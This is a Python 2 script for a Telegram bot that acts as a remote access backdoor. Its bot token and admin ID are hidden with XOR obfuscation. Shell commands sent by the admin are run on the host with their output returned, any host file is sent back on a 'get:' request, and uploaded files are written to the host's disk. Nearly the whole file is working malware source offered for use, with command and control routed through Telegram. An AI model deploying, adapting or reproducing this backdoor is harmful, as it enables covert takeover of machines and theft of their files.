# -*- coding: utf-8 -*-
import telebot 
from telebot import types 
import subprocess 
import requests
from shutil import copyfile, copyfileobj, rmtree
import os

def obfus(s):
	mask = 'xxxxxxx' <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
	nmask = [ord(c) for c in mask]
	lmask = len(mask)
	return ''.join([chr(ord(c) ^ nmask[i % lmask])
                    for i, c in enumerate(s)])
# Obfus cifra y descifra el texto con mask					
					
TOKEN = obfus('KRAY]NZ[\x0cB$9(+\x021/w\x1b\x06\x1f5\x1aB2Fs\n(9>\x1320\x1cp*\x04N9\x01><\x03a')
admin = int (obfus('NSN_[GR')) # Ojo si admin es un int o str ....no es lo mismo XD

bot = telebot.TeleBot(TOKEN)				
					

def split_string(n, st):
	lst = ['']
	for i in str(st):
		l = len(lst) - 1
		if len(lst[l]) < n: 
			lst[l] += i
		else:
			lst += [i]
	return lst

def listener(messages):
	for m in messages:
		# print m.from_user.id
		if m.from_user.id == admin:
			if m.content_type == 'text':
				if m.text.startswith('get'):

					try:
						bot.send_document( admin, open(  m.text.split(':')[1] ) )
					except:
						bot.send_message( admin, "Error sending document")
				else:
					execute_command(m)
				

		file_name = ''
		file_id = None
		
		if  m.content_type == 'document':
		
			file_name = m.document.file_name
			file_info = bot.get_file(m.document.file_id)
			file_path = file_info.file_path
			
			link =obfus('\x10\x11\x0c\x1f\x1aMLDY\x08\x0cV\x1b\x0c\x1b\x06\x0cJ\x19\x08V\x00\x1b\x10L\rQ\x14\x00W\r\x06\x03') + str(TOKEN) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(  file_name, 'wb') as out_file:
				copyfileobj(file, out_file)
			
			response = 'File received.'
			bot.send_message(admin, response.decode( 'unicode-escape' ).encode( 'utf-8' ))
		
		elif  m.content_type == 'photo':
			print m
			#file_info = bot.get_file(m.photo.file_id)
			#file_name = file_id + '.jpg'
			#file_path = file_info.file_path
  
bot.set_update_listener(listener) 

def execute_command(message):

	cid = message.chat.id
	

	result_command = subprocess.Popen(message.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
	result_command = result_command[0].replace(" "," ")
	
	if message.text[:3] == "cd "  : 
		
		os.chdir(message.text[3:])

		
	print result_command
	
	try:
		bot.send_message( cid, result_command)
	except:
		exception = True
	else:
		exception = False
	
	if exception:
		if result_command == "":
			bot.send_message( cid, "?")
		else:
			with open( 'tmp.txt', 'w') as f:
				f.write( result_command)

			bot.send_document( cid, open( 'tmp.txt', 'rb'))
			responses = split_string(4096, result_command)
			
			for resp in responses:
				bot.send_message(cid, resp.decode( 'unicode-escape' ).encode( 'utf-8' ))
				
			
			print




while True:			
	bot.polling(none_stop=True)

	
